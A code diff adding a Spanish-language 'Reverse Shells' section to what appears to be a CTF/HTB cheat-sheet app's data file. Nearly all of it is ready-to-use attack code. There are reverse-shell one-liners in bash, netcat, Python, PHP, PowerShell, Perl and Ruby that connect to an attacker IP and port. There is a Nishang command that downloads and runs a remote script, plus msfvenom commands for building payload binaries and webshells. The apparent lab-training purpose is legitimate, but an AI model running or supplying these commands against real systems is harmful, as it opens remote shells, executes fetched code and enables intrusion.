@@ -354,6 +354,54 @@ const DATA = [
     ]
   },
   {
+    id:"revshell", title:"🔁 Reverse Shells",
+    sections:[
+      {h:"Listener (atacante)", blocks:[
+        {p:"netcat — el más usado", code:`nc -lvnp <PUERTO>`},
+        {p:"Si no hay netcat, con socat o bash /dev/tcp", code:`socat -d -d TCP-LISTEN:<PUERTO> STDOUT`}
+      ]},
+      {h:"Bash", blocks:[
+        {p:"Bash -i (clásico)", code:`bash -i >& /dev/tcp/<IP>/<PUERTO> 0>&1`},
+        {p:"Bash sin -i (si el target bloquea shells interactivas)", code:`0<&196;exec 196<>/dev/tcp/<IP>/<PUERTO>; sh <&196 >&196 2>&196`},
+        {p:"/bin/sh (si no hay bash)", code:`sh -i >& /dev/tcp/<IP>/<PUERTO> 0>&1`}
+      ]},
+      {h:"Netcat", blocks:[
+        {p:"nc clásico", code:`nc -e /bin/sh <IP> <PUERTO>`},
+        {p:"nc sin -e (versiones que no lo soportan, ej. OpenBSD)", code:`rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PUERTO> >/tmp/f`},
+        {p:"ncat con shell cifrada (SSL)", code:`ncat --ssl <IP> <PUERTO> -e /bin/sh`}
+      ]},
+      {h:"Python", blocks:[
+        {p:"Python3 — Linux", code:`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PUERTO>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'`},
+        {p:"Python2 (sistemas viejos)", code:`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PUERTO>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`}
+      ]},
+      {h:"PHP", blocks:[
+        {p:"PHP one-liner (webshells, LFI a RCE)", code:`php -r '$sock=fsockopen("<IP>",<PUERTO>);exec("/bin/sh -i <&3 >&3 2>&3");'`},
+        {p:"Variante con proc_open (si fsockopen está deshabilitado)", code:`<?php $sock=fsockopen("<IP>",<PUERTO>);$proc=proc_open("/bin/sh -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes); ?>`}
+      ]},
+      {h:"PowerShell (Windows)", blocks:[
+        {p:"One-liner clásico (PowerShell TCP client)", code:`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PUERTO>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`},
+        {p:"Nishang (Invoke-PowerShellTcp) — más estable", code:`IEX (New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1')\nInvoke-PowerShellTcp -Reverse -IPAddress <IP> -Port <PUERTO>`}
+      ]},
+      {h:"Perl / Ruby", blocks:[
+        {p:"Perl", code:`perl -e 'use Socket;$i="<IP>";$p=<PUERTO>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`},
+        {p:"Ruby", code:`ruby -rsocket -e'f=TCPSocket.open("<IP>",<PUERTO>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`}
+      ]},
+      {h:"msfvenom — generar payloads/binarios", blocks:[
+        {p:"Linux ELF", code:`msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PUERTO> -f elf -o shell.elf`},
+        {p:"Windows EXE", code:`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PUERTO> -f exe -o shell.exe`},
+        {p:"PHP (webshell para upload)", code:`msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PUERTO> -f raw -o shell.php`},
+        {p:"ASPX (IIS)", code:`msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PUERTO> -f aspx -o shell.aspx`}
+      ]},
+      {h:"Estabilizar la shell (post-explotación)", blocks:[
+        {p:"Shell de Linux → TTY completa (pty + stty)", code:`python3 -c 'import pty; pty.spawn("/bin/bash")'\n# luego Ctrl+Z en tu terminal:\nstty raw -echo; fg\n# y dentro de la shell:\nexport TERM=xterm\nstty rows <filas> columns <columnas>`},
+        {p:"Si no hay python, con script", code:`script /dev/null -c bash`}
+      ]},
+      {h:"Generador de payloads online (referencia rápida)", blocks:[
+        {p:"Para no tipear a mano — pegar IP/puerto y copiar", code:`https://www.revshells.com/`}
+      ]}
+    ]
+  },
+  {
     id:"flags", title:"🚩 Buscar Flags (HTB / THM)", 
     sections:[
       {h:"Ubicaciones típicas", blocks:[
